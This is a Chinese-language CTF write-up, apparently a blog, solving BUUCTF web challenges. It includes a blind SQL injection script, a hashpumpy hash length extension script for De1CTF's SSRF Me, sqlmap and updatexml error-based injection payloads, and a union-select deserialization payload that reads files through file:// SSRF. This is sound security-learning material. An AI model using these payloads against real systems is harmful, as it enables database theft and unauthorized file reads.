<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://b9b3fd3f-2f40-4927-8d69-50ffc78f9a4a.node3.buuoj.cn/index.php"</span></span><br><span class="line">payload = &#123;</span><br><span class="line">	<span class="string">"id"</span> : <span class="string">""</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	l = <span class="number">33</span></span><br><span class="line">	r =<span class="number">130</span></span><br><span class="line">	mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span>(l&lt;r):</span><br><span class="line">		payload[<span class="string">"id"</span>] = <span class="string">"0^"</span> + <span class="string">"(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span>.format(i,mid)</span><br><span class="line">		html = requests.post(url,data=payload)</span><br><span class="line">		print(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">			l = mid+<span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			r = mid</span><br><span class="line">		mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span>(chr(mid)==<span class="string">" "</span>):</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	result = result + chr(mid)</span><br><span class="line">	print(result)</span><br><span class="line">print(<span class="string">"flag: "</span> ,result)</span><br></pre></td></tr></table></figure>

<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h3><p>首先拿到源码，是Flask写的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
<p>我们发现，代码中定义了一个<code>task</code>类，其中主要包括三部分：<code>__init__()</code>、<code>Exec()</code>、<code>checkSign</code>。<br><code>__init__()</code>中以用户的<code>IP</code>生成一个沙箱：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">    self.action = action</span><br><span class="line">    self.param = param</span><br><span class="line">    self.sign = sign</span><br><span class="line">    self.sandbox = md5(ip)</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">        os.mkdir(self.sandbox)</span><br></pre></td></tr></table></figure>
<p><code>Exec()</code>可以执行一些操作：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                result[<span class="string">'data'</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>我们可以看到，<code>Exec()</code>函数可以执行<code>scan</code>操作，对目标文件进行扫描并把结果存在<code>result.txt</code>中；<code>read</code>操作可以读取<code>ressult.txt</code>中的内容。同时<code>param</code>又是用户输入，那么通过利用<code>param</code>和上述两个操作，进行<code>SSRF</code>以拿到flag。</p>
<p>往下我们看到三个路由：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br></pre></td></tr></table></figure>
<p><code>/geneSign</code>路由：获得param参数，通过<code>action</code>和<code>param</code>生成签名。并且在服务端的签名是通过<code>action=&quot;scan&quot;</code>生成的，那就限制了用户执行的方法。<br><code>/De1ta</code>路由：获取<code>cookie</code>中的<code>action</code>和<code>param</code>以及签名<code>sign</code>，如果<code>param</code>合法则生成<code>task</code>对象，并返回执行的内容。<br><code>/</code>路由：读取代码。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>我们从前面知道，服务端的签名已经限制为<code>action=&quot;scan&quot;</code>了，因此如果我们传入的方法有<code>read</code>那签名值将会不同，将不能实现读取。<br>因此我们需要绕过<code>sign</code>的限制。我们可以发现<code>getSign</code>其实是有漏洞的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>即当我们输入<code>param=flag.txtread</code>的时候，那<code>sign</code>值就是包含<code>read</code>和<code>scan</code>的了，也就可以实现对文件的读取了。</p>
<h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>这里有两种方法，第一种是利用<code>SSRF</code>，也是本题的考点，第二种是<code>hash长度扩展攻击</code>，看别的大佬的思路才知道的。</p>
<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>首先我们在<code>/geneSign</code>路由中利用<code>param=flag.txtread</code>生成一个签名：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web9.png" alt=""><br>然后通过<code>/De1ta</code>路由生成服务端的签名，需要利用BP抓包改包：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web10.png" alt=""><br>这里需要注意，我们在<code>/De1ta</code>路由是通过<code>GET</code>方式传<code>param</code>的，但是<code>Cookie</code>需要我们手动加入，从下面这段代码可知：我们需要在<code>cookie</code>中写入<code>action</code>和<code>sign</code>值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br></pre></td></tr></table></figure>
<p>从而实现通过构造<code>sign</code>绕过限制实现<code>SSRF</code>读取服务器资源，拿到flag。</p>
<h4 id="Hash长度扩展攻击"><a href="#Hash长度扩展攻击" class="headerlink" title="Hash长度扩展攻击"></a>Hash长度扩展攻击</h4><p>哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了<code>H(密钥 ∥ 消息)</code>此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。<br>一般满足下面条件的情形可以进行哈希长度扩展攻击：</p>
<ul>
<li>1、准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature/签名）；</li>
<li>2、让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文；</li>
<li>3、服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值</li>
</ul>
<p>详细可参考：<a href="https://www.freebuf.com/articles/web/69264.html">https://www.freebuf.com/articles/web/69264.html</a><br>该题中，<code>sign</code>的计算：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
<p>显然满足这种情况，因此可以进行哈希长度扩展攻击。<br>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">txt1 = <span class="string">'flag.txt'</span></span><br><span class="line">r = requests.get(<span class="string">'http://f335feee-943e-406b-8fc6-e5d65f709d15.node3.buuoj.cn/geneSign'</span>, params=&#123;<span class="string">'param'</span>: txt1&#125;)</span><br><span class="line">sign = r.text</span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, txt1 + <span class="string">'scan'</span>, <span class="string">'read'</span>, <span class="number">16</span>)</span><br><span class="line">r = requests.get(<span class="string">'http://f335feee-943e-406b-8fc6-e5d65f709d15.node3.buuoj.cn/De1ta'</span>, params=&#123;<span class="string">'param'</span>: txt1&#125;, cookies=&#123;</span><br><span class="line">    <span class="string">'sign'</span>: hash_sign[<span class="number">0</span>],</span><br><span class="line">    <span class="string">'action'</span>: urllib.parse.quote(hash_sign[<span class="number">1</span>][len(txt1):])</span><br><span class="line">&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入链接，是一个可以注册和登录的页面，这里的注册页面是以<code>POST</code>上传数据的，利用<code>sqlmap</code>测试发现有<code>POST</code>注入，具体方法是：</p>
<ul>
<li>1、注册用户时用BP抓包，保存<code>POST</code>表单的数据到文件;</li>
<li>2、然后利用<code>sqlmap</code>爆库：</li>
</ul>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">python</span> <span class="comment">sqlmap</span><span class="string">.</span><span class="comment">py</span> <span class="literal">-</span><span class="comment">r</span> <span class="comment">"the</span> <span class="comment">path</span> <span class="comment">of</span> <span class="comment">the</span> <span class="comment">catched</span> <span class="comment">file"</span> --<span class="comment">dump</span> --<span class="comment">dbs</span></span><br></pre></td></tr></table></figure>
<p>结果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web13.png" alt=""><br>这个截图中没有体现出完整的数据库信息，完整的序列化内容中包含的还有<code>blog</code>的地址，下面的<code>payload</code>中可以看到。</p>
<p>经过测试，在<code>wiew.php</code>路径下存在<code>GET</code>注入，这里存在报错注入，可以利用<code>extractvalue()</code>和<code>updatexml()</code>进行测试，但是我在用<code>extractvalue()</code>进行测试时失败了，用<code>updatexml()</code>可以成功注入。利用<code>extractvalue()</code>的报错注入可参考我之前的文章<a href="http://47.107.152.5:2017/2020/02/02/RootersCTF-Babyweb-WriteUp/">RootersCTF-Babyweb-WriteUp</a>。<br>报错注入可参考：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">https://blog.csdn.net/zpy1998zpy/article/details/80631036</a></p>
<h3 id="进行GET注入"><a href="#进行GET注入" class="headerlink" title="进行GET注入"></a>进行GET注入</h3><p>利用常规的手注方法，结合<code>updatexml()</code>以实现报错注入：</p>
<ul>
<li>1、爆库名</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">view</span>.php?<span class="keyword">no</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(<span class="keyword">select</span> <span class="keyword">database</span>())),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web14.png" alt=""></p>
<ul>
<li>2、爆表名</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">view</span>.php?<span class="keyword">no</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web15.png" alt=""></p>
<ul>
<li>3、爆列名</li>
</ul>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">view</span>.php?<span class="keyword">no</span>=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>="users")),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
<p><img src="http://www.ggb0n.cool/images/BUUCTF-web16.png" alt=""></p>
<ul>
<li>4、爆字段</li>
</ul>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/view.php?no=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">'~'</span>,(select data <span class="keyword">from</span> users)),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>

<p><img src="http://www.ggb0n.cool/images/BUUCTF-web17.png" alt=""><br>我们看到，最后爆出的字段知包含了一串序列化的内容，也可以根据<code>POST</code>注入的结果发现，而并没有拿到flag。这里要注意，<code>union select</code>联合查询会被检测出，因此用<code>\**\</code>来绕过。<br>参考网上的WP发现，该题并非只考察注入，<strong>还考察了<code>SSRF</code>、反序列化构造file文件协议</strong>。</p>
<h3 id="利用File协议进行SSRF读取flag文件"><a href="#利用File协议进行SSRF读取flag文件" class="headerlink" title="利用File协议进行SSRF读取flag文件"></a>利用File协议进行SSRF读取flag文件</h3><p>御剑扫描发现<code>robots.txt</code>和<code>flag.php</code>文件，并且根据前面报错注入的返回页面可见，<code>flag.php</code>文件是存在<code>/var/www/html/</code>下的。同时在<code>robots.txt</code>中发现了备份文件<code>/user.php.bak</code>，其源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现<code>get()</code>函数总传参是一个<code>url</code>，因此猜测存在<code>SSRF</code>，前面我们也知道了可以利用<code>file://</code>协议来读取flag文件，可以构造<code>file:///var/www/html/flag.php</code>语句并将其作为用户的<code>blog</code>地址写入，最后利用联合查询和反序列化将该语句写入到数据库，payload如下：</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">/<span class="built_in">view</span>.php?no=<span class="number">0</span><span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,'O:<span class="number">8</span>:<span class="string">"UserInfo"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">1</span>:<span class="string">"1"</span>;s:<span class="number">3</span>:<span class="string">"age"</span>;i:<span class="number">1</span>;s:<span class="number">4</span>:<span class="string">"blog"</span>;s:<span class="number">29</span>:<span class="string">"file:///var/www/html/flag.php"</span>;&#125;'</span><br></pre></td></tr></table></figure>
<p>效果如下：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web11.png" alt=""><br>此时，我们写入的可以读取文件的<code>blog</code>地址已经奏效，查看源码可以看到一串base64的编码，解码即为读取的<code>flag.php</code>的内容。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web12.png" alt=""></p>
<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>目测是签到题，源码中提示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line"><span class="keyword">echo</span> $cat;</span><br><span class="line"><span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单，<code>?cat=dog</code>即可</p>
<h2 id="RoarCTF-2019-EasyJava"><a href="#RoarCTF-2019-EasyJava" class="headerlink" title="[RoarCTF 2019]EasyJava"></a>[RoarCTF 2019]EasyJava</h2><p>考察<code>web.xml</code>的泄露，Javaweb没学过…不过这个题目学到了一点：<strong>类似于题目给的Help文件下载失败的时候可以尝试改变请求方式</strong>去下载。<br>附上一些有关源码泄露的网站：<a href="https://blog.csdn.net/wy_97/article/details/78165051">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>进去题目之后看源码，发现<code>Archive_room.php</code>文件，点进去之后给了一个按钮，这个按钮存在<code>302跳转</code>，因此需要BP抓包。<br>抓包发现，点击时候先访问的是<code>action.php</code>，在改文件中看到了提示的<code>secr3t.php</code>文件，再查看这个文件给了源码：</p>
